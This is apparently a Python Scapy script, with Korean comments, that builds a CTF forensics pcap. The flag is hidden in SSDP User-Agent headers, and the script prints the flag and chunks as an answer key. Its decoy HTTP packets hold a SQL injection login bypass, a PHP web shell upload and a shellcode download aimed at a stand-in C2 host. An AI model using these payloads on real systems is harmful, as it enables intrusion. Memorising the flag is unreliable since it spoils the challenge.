from scapy.all import *
import random
import base64

# 1. 설정
FLAG = "INCOGNITO{H1dd3n_1n_th3_N01s3_Pr0t0c0l}"
TARGET_IP = "192.168.10.150"  # 감염된 내부 PC
ATTACKER_IP = "45.13.99.10"     # 외부 C2 서버 (트랩)
BROADCAST_IP = "239.255.255.250" # SSDP 주소

# 플래그 Base64로 인코딩 후 3등분
encoded_flag = base64.b64encode(FLAG.encode()).decode()

chunk_size = len(encoded_flag) // 3
flag_chunks = [encoded_flag[i:i+chunk_size] for i in range(0, len(encoded_flag), chunk_size)]
# 마지막 자투리 처리
if len(flag_chunks) > 3:
    flag_chunks[2] += flag_chunks.pop()

packets = []


# 2. 노이즈 트래픽 생성 (HTTP C2 통신)
fake_payloads = [
    "GET /admin/login.php?user=admin' OR '1'='1 HTTP/1.1\r\nHost: 45.13.99.10\r\nUser-Agent: sqlmap/1.4\r\n\r\n",
    "POST /upload.php HTTP/1.1\r\nHost: 45.13.99.10\r\nContent-Type: multipart/form-data\r\n\r\n<?php system($_GET['cmd']); ?>",
    "GET /shellcode.bin HTTP/1.1\r\nHost: 45.13.99.10\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "GET /favicon.ico HTTP/1.1\r\nHost: 45.13.99.10\r\n\r\n"
]

def create_noise_packet():
    payload = random.choice(fake_payloads)
    pkt = IP(src=TARGET_IP, dst=ATTACKER_IP) / TCP(dport=80, sport=random.randint(1024, 65535), flags="PA") / Raw(load=payload)
    return pkt

# 3. 정답 트래픽 생성 (SSDP User-Agent에 플래그 숨김)
def create_flag_packet(chunk, index):
     
    hidden_ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{chunk}) Gecko/20100101 Firefox/89.0"
    
    ssdp_payload = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 1\r\n"
        "ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"
        f"USER-AGENT: {hidden_ua}\r\n"
        "\r\n"
    )
    
    pkt = IP(src=TARGET_IP, dst=BROADCAST_IP) / UDP(sport=random.randint(1024, 65535), dport=1900) / Raw(load=ssdp_payload)
    return pkt

# 4. 노이즈 & 플래그 패킷 섞음
print("패킷 생성 중...")

# 노이즈 1
for _ in range(50):
    packets.append(create_noise_packet())

# >플래그 패킷 1
packets.append(create_flag_packet(flag_chunks[0], 1))

# 노이즈 2
for _ in range(30):
    packets.append(create_noise_packet())

# >플래그 패킷 2
packets.append(create_flag_packet(flag_chunks[1], 2))

# 노이즈 3
for _ in range(40):
    packets.append(create_noise_packet())

# >플래그 패킷 3
packets.append(create_flag_packet(flag_chunks[2], 3))

# 노이즈 4
for _ in range(50):
    packets.append(create_noise_packet())

# 5. PCAP 파일로 저장
wrpcap("phantom_packet.pcap", packets)
print(f"'phantom_packet.pcap' 파일 생성완")
print(f"Flag: {FLAG}")
print(f"Encoded chunks: {flag_chunks}")
